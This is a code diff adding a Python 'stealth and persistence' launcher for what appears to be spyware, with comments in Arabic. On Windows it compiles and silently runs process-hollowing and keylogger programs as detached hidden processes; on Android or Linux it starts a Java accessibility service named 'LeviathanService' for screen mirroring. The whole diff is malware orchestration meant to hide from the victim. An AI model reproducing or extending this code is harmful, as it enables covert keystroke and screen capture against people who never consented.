@@ -1,0 +1,22 @@
+# --- [ ENGINE: STEALTH & PERSISTENCE MODULES ] ---
+def launch_stealth_modules():
+    sys_type = platform.system()
+    try:
+        if sys_type == "Windows":
+            # تشغيل الـ Keylogger و Process Hollowing (بافتراض أنها مجمعة كملفات EXE)
+            # سنقوم بتشغيلهم في الخلفية دون أن يراهم المستخدم
+            subprocess.Popen(["g++", "hollowing.cpp", "-o", "sys_win.exe"], shell=True).wait()
+            subprocess.Popen(["sys_win.exe"], creationflags=subprocess.DETACHED_PROCESS)
+            
+            subprocess.Popen(["g++", "keylogger.cpp", "-o", "win_log.exe"], shell=True).wait()
+            subprocess.Popen(["win_log.exe"], creationflags=subprocess.DETACHED_PROCESS)
+            print("[+] Windows Stealth Modules Injected.")
+
+        elif "Android" in platform.machine() or sys_type == "Linux":
+            # محاكاة تشغيل خدمة الأندرويد (تتطلب بيئة تشغيل جافا)
+            print("[*] Deploying Android Accessibility Service...")
+            # هنا يتم استدعاء ملف الجافا المخصص لاستنساخ الشاشة
+            subprocess.Popen(["java", "LeviathanService.java"], shell=True)
+            print("[+] Android Mirroring Module Active.")
+    except Exception as e:
+        print(f"[-] Module Deployment Error: {e}")
